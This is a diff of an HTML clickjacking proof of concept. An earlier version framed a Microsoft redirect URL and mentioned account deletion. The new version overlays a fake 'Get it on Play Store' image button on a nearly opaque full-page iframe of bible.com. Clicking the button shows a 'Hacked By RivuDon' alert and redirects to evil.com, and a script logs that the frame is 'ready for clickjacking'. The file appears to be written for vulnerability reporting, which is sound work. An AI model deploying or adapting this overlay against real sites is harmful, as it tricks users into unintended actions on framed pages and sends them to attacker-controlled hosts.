@@ -1,9 +1,7 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MSRC POC</title>
+<title>Bible POC</title>
+
 <style>
     iframe {
         position: absolute;
@@ -11,47 +9,50 @@
         left: 0;
         width: 100%;
         height: 100%;
-        opacity: 0.9; /* Makes the iframe invisible */
+        opacity: 0.9;
         z-index: 99;
     }
 
- button {
-    z-index: 100;
-    top: 297px;
-    left: 482px;
-    position: relative;
-    cursor: pointer;        /* Optional: show pointer on hover */
-    color: white;
-    width: 12%;
-    height: 20%;
-    border-radius: 10px;
-    background: transparent;    /* <-- Add this line */
-    border: 1px solid white;    /* Optional: add a border for visibility */
-}
-
-
-    h1 {
-        top: 300px;
+    /* Image button */
+    .login-btn {
         position: relative;
+        top: 495px;
+        left: 480px;
+        z-index: 200;
 
+        border: none;
+        background: none;
+        cursor: pointer;
+        padding: 0;
     }
+
+    .login-btn img {
+        width: 145px; /* adjust size as needed */
+        height: auto;
+    }
+
 </style>
 </head>
-<body>
-<button onclick="alert('Surprise Hacked! - POC RivuDon')" type="submit">
-        <img src="GooglePlayStoreBadge.png" height="43px" alt="buttonpng"/>
-      </button>
 
-<!-- Invisible iframe targeting the account deletion URL -->
-<iframe id="target-frame" src="https://krs.microsoft.com/redirect?id=lxDNVZKK" frameborder="0"></iframe>
+<body>
+
+<button class="login-btn" onclick="handleClick()">
+    <img src="play-store-badge.avif" alt="Get it on Play Store">
+</button>
+
+<!-- Invisible iframe -->
+<iframe id="target-frame" src="https://www.bible.com/" frameborder="0"></iframe>
 
 <script>
-    
-    document.getElementById('target-frame').onload = function() {
-        
-        console.log('Iframe has loaded, ready for clickjacking.');
-    };
-</script>
-</body>
+function handleClick() {
+  alert("Hacked By RivuDon");
+  window.location.href = "https://evil.com";
+}
 
+document.getElementById('target-frame').onload = function() {
+  console.log('Iframe has loaded, ready for clickjacking.');
+};
+</script>
+
+</body>
 </html>
